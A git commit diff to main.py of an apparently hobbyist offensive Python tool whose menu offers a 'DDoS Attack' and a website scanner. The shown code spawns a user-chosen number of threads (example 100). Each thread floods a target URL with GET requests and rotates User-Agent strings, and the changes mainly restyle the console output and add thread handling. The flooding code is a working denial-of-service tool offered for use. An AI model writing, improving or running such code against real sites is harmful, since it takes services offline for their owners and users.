8f5a7aa07d84ac644b72fd5d08ee2170a355fe60
marsel <125736253+marsel-hash@users.noreply.github.com>
2025-02-16 21:02:22 +0700

    main.py

--- main.py
+++ main.py
@@ -3,9 +3,11 @@ import requests
 import time
 import random
 import socket
+from queue import Queue
 from colorama import Fore, Style, init
 
 init(autoreset=True)
+lock = threading.Lock() 
 
 USER_AGENTS = [
     "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
@@ -18,7 +20,9 @@ def attack(target_url, delay):
         try:
             headers = {"User-Agent": random.choice(USER_AGENTS)}
             response = requests.get(target_url, headers=headers)
-            print(f"{Fore.GREEN}[✓] {Fore.WHITE}Request sent! {Fore.CYAN}Status: {Fore.YELLOW}{response.status_code}")
+            with lock: 
+             print(f"{Fore.GREEN}[✓] {Fore.WHITE}Request sent! {Fore.CYAN}Status: {Fore.YELLOW}{response.status_code}", flush=True)
+
         except Exception as e:
             print(f"{Fore.RED}[✗] {Fore.WHITE}Error: {Fore.YELLOW}{e}")
         time.sleep(delay)
@@ -37,14 +41,14 @@ def scan_website(url):
         if 'x-generator' in response.headers:
             technologies.append(response.headers['x-generator'])
 
-        print(f"\n{Fore.BLUE}╔{'═'*50}╗")
-        print(f"║{Fore.RED}{'WEBSITE SCAN RESULTS':^50}{Fore.BLUE}║")
-        print(f"╠{'═'*50}╣")
-        print(f"║ {Fore.WHITE}URL: {Fore.CYAN}{url.ljust(44)}{Fore.BLUE}║")
-        print(f"║ {Fore.WHITE}IP Address: {Fore.CYAN}{ip_address.ljust(37)}{Fore.BLUE}║")
-        print(f"║ {Fore.WHITE}Server: {Fore.CYAN}{server_header.ljust(41)}{Fore.BLUE}║")
-        print(f"║ {Fore.WHITE}Technology: {Fore.CYAN}{', '.join(technologies).ljust(37)}{Fore.BLUE}║")
-        print(f"╚{'═'*50}╝")
+        print(f"\n{Fore.CYAN}╔{'═'*50}╗")
+        print(f"{Fore.CYAN}║{Fore.CYAN}{'WEBSITE SCAN RESULTS':^50}{Fore.LIGHTBLUE_EX}║")
+        print(f"{Fore.CYAN}╠{'═'*50}╣")
+        print(f"{Fore.CYAN}║ {Fore.YELLOW}URL: {Fore.RED}{url.ljust(44)}{Fore.LIGHTBLUE_EX}║")
+        print(f"{Fore.CYAN}║ {Fore.YELLOW}IP Address: {Fore.RED}{ip_address.ljust(37)}{Fore.LIGHTBLUE_EX}║")
+        print(f"{Fore.CYAN}║ {Fore.YELLOW}Server: {Fore.RED}{server_header.ljust(41)}{Fore.LIGHTBLUE_EX}║")
+        print(f"{Fore.CYAN}║ {Fore.YELLOW}Technology: {Fore.RED}{', '.join(technologies).ljust(37)}{Fore.LIGHTBLUE_EX}║")
+        print(f"{Fore.CYAN}╚{'═'*50}╝")
     except Exception as e:
         print(f"{Fore.RED}[✗] {Fore.WHITE}Error while scanning: {Fore.YELLOW}{e}")
 
@@ -60,13 +64,13 @@ def print_banner():
     """)
 
 def print_menu():
-    print(f"{Fore.WHITE}╔{'═'*50}╗")
-    print(f"║{Fore.CYAN}{'MAIN COURSE':^50}{Fore.WHITE}║")
-    print(f"╠{'═'*50}╣")
-    print(f"║ {Fore.BLUE}1.{Fore.RED} DDoS Attack{' '*35}{Fore.WHITE}║")
-    print(f"║ {Fore.BLUE}2.{Fore.RED} Website Scanning{' '*30}{Fore.WHITE}║")
-    print(f"║ {Fore.BLUE}3.{Fore.RED} Exit{' '*42}{Fore.WHITE}║")
-    print(f"╚{'═'*50}╝")
+    print(f"{Fore.CYAN}╔{'═'*50}╗")
+    print(f"{Fore.CYAN}║{Fore.CYAN}{'MAIN MENU':^50}{Fore.LIGHTBLUE_EX}║")  
+    print(f"{Fore.CYAN}╠{'═'*50}╣")
+    print(f"{Fore.CYAN}║ {Fore.YELLOW}1.{Fore.RED} DDoS Attack{' '*35}{Fore.LIGHTBLUE_EX}║")  
+    print(f"{Fore.CYAN}║ {Fore.YELLOW}2.{Fore.RED} Website Scanner{' '*31}{Fore.LIGHTBLUE_EX}║")  
+    print(f"{Fore.CYAN}║ {Fore.YELLOW}3.{Fore.RED} Exit{' '*42}{Fore.LIGHTBLUE_EX}║")  
+    print(f"{Fore.CYAN}╚{'═'*50}╝")
 
 def fanxiety_tool():
     print_banner()
@@ -75,17 +79,18 @@ def fanxiety_tool():
     choice = input(f"\n{Fore.YELLOW}[?]{Fore.WHITE} Select options: ")
     
     if choice == "1":
-        print(f"\n{Fore.BLUE}╔{'═'*50}╗")
-        print(f"║{Fore.RED}{'ATTACK CONFIGURATION':^50}{Fore.BLUE}║")
-        print(f"╠{'═'*50}╣")
+        print(f"\n{Fore.CYAN}╔{'═'*50}╗")
+        print(f"{Fore.CYAN}║{Fore.RED}{'ATTACK CONFIGURATION':^50}{Fore.LIGHTBLUE_EX}║")  
+        print(f"{Fore.CYAN}╠{'═'*50}╣")
+
+        thread_count = int(input(f"{Fore.CYAN}║ {Fore.WHITE}Number of Threads (example: 100): {Fore.LIGHTBLUE_EX}"))
+        target_url = input(f"{Fore.CYAN}║ {Fore.WHITE}Target URL: {Fore.LIGHTBLUE_EX}")
+        delay = float(input(f"{Fore.CYAN}║ {Fore.WHITE}Delay (second): {Fore.LIGHTBLUE_EX}"))
+        print(f"{Fore.CYAN}╚{'═'*50}╝")
+
+
         
-        thread_count = int(input(f"{Fore.BLUE}║ {Fore.WHITE}Number of Threads (example: 100): "))
-        target_url = input(f"{Fore.BLUE}║ {Fore.WHITE}Target URL: ")
-        delay = float(input(f"{Fore.BLUE}║ {Fore.WHITE}Delay (second): "))
-        print(f"╚{'═'*50}╝")
-        
-        print(f"\n{Fore.MAGENTA}[!] {Fore.WHITE}Starting the attack on {Fore.CYAN}{target_url}")
-        print(f"{Fore.MAGENTA}[!] {Fore.WHITE}Press {Fore.RED}CTRL+C {Fore.WHITE}to stop\n")
+        print(f"\n{Fore.GREEN}[✓] {Fore.WHITE}Attack started! Press {Fore.RED}Ctrl + C {Fore.WHITE}to stop and return to menu...\n")
         
         for _ in range(thread_count):
             thread = threading.Thread(target=attack, args=(target_url, delay))
@@ -94,14 +99,16 @@ def fanxiety_tool():
         
         while True:
             time.sleep(1)
+            
     
     elif choice == "2":
         target_url = input(f"\n{Fore.BLUE}║ {Fore.WHITE}Enter URL to scan: ")
         scan_website(target_url)
-    
-    elif choice == "3":
+
+    elif choice == "":
         print(f"\n{Fore.RED}[!] {Fore.WHITE}Exit the program...")
         exit()
+
     
     else:
         print(f"\n{Fore.RED}[!] {Fore.WHITE}Invalid option!")
